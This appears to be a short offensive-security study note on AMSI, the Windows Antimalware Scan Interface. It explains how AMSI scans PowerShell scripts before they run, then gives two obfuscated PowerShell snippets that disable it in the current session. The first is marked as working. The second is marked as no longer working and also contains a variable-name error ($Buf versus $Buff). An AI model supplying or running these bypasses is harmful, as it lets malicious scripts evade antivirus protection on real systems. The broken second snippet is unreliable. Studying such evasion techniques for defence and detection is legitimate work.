
>[!info]
>This note is still in development.

### Overview
---

AMSI stands for "Antimalware Scan Interface" and is the predominant defense against malicious PowerShell scripts and tools on Windows systems.

When a script is executed in a supported environment (e.g., a PowerShell script), the script content can be passed to the installed antivirus or antimalware software via AMSI for scanning before execution. If malicious code is detected, the execution can be blocked.

(This is separate from Windows Defender Real-time Protection or anything being downloaded to/executed from disk.)

Because of this, a key goal for attackers is to bypass AMSI.

### Example
---

- Example Bypass #1: Telling AMSI that initialization failed. (working)
```powershell
# Disable AMSI in the current session (doesn't work in PowerShell Core)
$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}}
$Var.SetValue($NULL,$TRUE)
```

- Example Bypass #2: Setting AMSI context to null (stopped working)
```powershell
$Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ontext"}}}
[IntPtr]$Ptr=$Var.GetValue($NULL); [Int32[]]$Buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($Buff, 0, $Ptr, 1)
```
